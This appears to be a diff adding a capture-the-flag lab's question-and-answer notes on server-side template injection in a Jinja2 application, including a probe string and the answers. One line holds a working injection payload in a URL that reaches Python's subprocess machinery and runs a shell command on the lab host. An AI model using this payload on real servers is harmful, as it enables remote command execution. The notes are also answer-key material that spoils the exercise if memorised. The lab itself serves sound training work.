@@ -1,0 +1,16 @@
+What sequence of characters causes the application to throw an error?
+Ans : {{
+ 
+ 
+What template engine is being used in this application?
+Ans :Jinja2
+
+How do you start a comment in Jinja2?
+Ans : {#
+
+
+What is the result of the "whoami" shell command? (payload: http://10.10.76.243:5000/profile/%7B%7B%20''.__class__.__mro__[1].__subclasses__()[401](%22whoami%22,%20shell=True,%20stdout=-1).communicate()%20%7D%7D)
+Ans : jake
+
+ What payload was used to confirm SSTI?
+ {{ '7'*7 }}
